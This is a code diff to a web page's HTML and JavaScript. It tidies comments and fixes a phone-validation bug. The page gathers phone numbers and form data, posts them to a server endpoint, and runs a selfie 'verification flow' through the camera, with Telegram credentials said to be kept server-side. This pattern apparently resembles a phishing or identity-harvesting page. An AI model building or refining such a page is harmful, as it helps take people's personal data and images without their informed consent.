@@ -148,7 +148,7 @@
             background: #fff;
         }
 
-        /* ----- Phone Group with Custom Dropdown ----- */
+        /* Phone Group */
         .phone-group {
             display: flex;
             gap: 10px;
@@ -642,11 +642,11 @@
 
     <script>
         // ============================================================
-        // NO HARDCODED TELEGRAM TOKEN/Chat_ID – Server API endpoints use env vars
+        // NO HARDCODED TELEGRAM CREDENTIALS – Server API endpoints used
         // ============================================================
 
         // ============================================================
-        // 1. COUNTRY DATABASE (Flag + Code + Name) – India at top
+        // 1. COUNTRY DATABASE
         // ============================================================
         const COUNTRIES = [
             { code: "+91", flag: "🇮🇳", name: "India" },
@@ -805,13 +805,17 @@
         detectAndSetCountry();
 
         // ============================================================
-        // 4. PHONE VALIDATION (Auto-remove leading zero)
+        // 4. PHONE VALIDATION (FIXED: error element found via .form-group)
         // ============================================================
         function validatePhone(input) {
-            const group = input.closest('.phone-group');
-            const error = group.querySelector('.phone-error');
+            const formGroup = input.closest('.form-group');
+            const error = formGroup.querySelector('.phone-error');
             let raw = input.value.trim();
-            if (!raw) { error.classList.remove('show'); return true; }
+
+            if (!raw) {
+                error.classList.remove('show');
+                return true;
+            }
 
             let local = raw;
             if (raw.startsWith('+')) {
@@ -819,6 +823,7 @@
                 let detected = false;
                 for (const c of sorted) {
                     if (raw.startsWith(c.code)) {
+                        const group = input.closest('.phone-group');
                         const selected = group.querySelector('.selected');
                         selected.querySelector('.flag').textContent = c.flag;
                         selected.querySelector('.code').textContent = c.code;
@@ -907,7 +912,6 @@
 
             verificationState.formData = { type: formType, ...data };
 
-            // Send to server API (which uses env vars)
             fetch('/api/submit-form', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -925,7 +929,7 @@
         }
 
         // ============================================================
-        // 8. VERIFICATION FLOW (Server API for selfies & completion)
+        // 8. VERIFICATION FLOW
         // ============================================================
         function startVerification() {
             navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 1280, height: 720 } })
